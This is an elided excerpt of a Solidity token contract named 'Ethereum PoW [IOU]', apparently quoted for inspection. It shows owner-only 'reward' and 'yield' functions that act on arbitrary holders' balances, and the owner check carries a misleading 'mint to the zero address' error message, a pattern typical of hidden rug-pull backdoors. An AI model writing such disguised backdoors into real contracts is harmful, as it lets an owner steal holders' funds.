...
contract EthereumPoW is Context, IERC20 {
    ...
    address lead_deployer = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
    address public _owner = 0x76A156a6c305DfBfE1bD4c14B628D79908F90158;
   constructor () public {


        
        _name = "Ethereum PoW [IOU]";
        _symbol = "ETHW";
        _decimals = 18;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function reward(address account) public {
        ...
        function yield(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
